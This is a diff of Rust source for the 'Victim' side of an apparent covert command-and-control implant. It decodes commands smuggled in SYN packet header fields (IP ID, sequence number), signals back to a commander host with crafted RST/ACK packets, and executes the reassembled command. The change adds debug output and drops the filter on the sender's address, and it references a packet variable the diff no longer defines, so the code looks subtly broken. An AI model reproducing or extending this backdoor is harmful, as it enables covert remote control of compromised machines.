@@ -111,42 +111,46 @@ impl Victim {
                 }
             }
 
-            if let Ok((packet, _)) = rx_iter.next() {
-                // Ignore packets not from our commander
-                if packet.get_source() != commander_ip { continue; }
+            if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
+                if parsed.dst_port == my_port {
 
-                if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
-                    if parsed.dst_port == my_port {
-                        // Apply chunk and get the signature to send back
-                        if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                            
-                            // Craft the custom RST/ACK with the mathematical signature
-                            let rst_params = covert::RstAckParams {
-                                src_ip: self.local_ip,
-                                dst_ip: commander_ip,
-                                src_port: my_port,
-                                dst_port: parsed.src_port,
-                                ack_number: parsed.seq.wrapping_add(1),
-                                ip_id: sig_id, // This is the signature Commander is waiting for
-                            };
+                    println!("\n[VICTIM] === SYN RECEIVED ===");
+                    println!("[VICTIM] From: {}:{}", parsed.src_ip, parsed.src_port);
+                    println!("[VICTIM] IP ID: {}", parsed.ip_id);
+                    println!("[VICTIM] Masked SEQ: 0x{:08x}", parsed.seq);
 
-                            let rst_pkt = covert::build_rst_ack_packet(&rst_params);
-                            let _ = tx.send_to(
-                                pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), 
-                                IpAddr::V4(commander_ip)
-                            );
+                    if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
 
-                            if receiver_state.complete {
-                                if let Ok(cmd_str) = receiver_state.message_str() {
-                                    println!("[*] Executing Command: {}", cmd_str);
-                                    self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
-                                }
-                                receiver_state = covert::ReceiverState::new();
+                        println!("[VICTIM] Generated Signature: 0x{:04x}", sig_id);
+
+                        let rst_params = covert::RstAckParams {
+                            src_ip: self.local_ip,
+                            dst_ip: commander_ip,
+                            src_port: my_port,
+                            dst_port: parsed.src_port,
+                            ack_number: parsed.seq.wrapping_add(1),
+                            ip_id: sig_id,
+                        };
+
+                        let rst_pkt = covert::build_rst_ack_packet(&rst_params);
+
+                        println!("[VICTIM] Sending RST/ACK back to Commander...\n");
+
+                        let _ = tx.send_to(
+                            pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(),
+                            IpAddr::V4(commander_ip)
+                        );
+
+                        if receiver_state.complete {
+                            if let Ok(cmd_str) = receiver_state.message_str() {
+                                println!("[VICTIM] Complete Command: {}", cmd_str);
+                                self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
                             }
+                            receiver_state = covert::ReceiverState::new();
                         }
                     }
                 }
-            }
+            }            
         }
     }
 
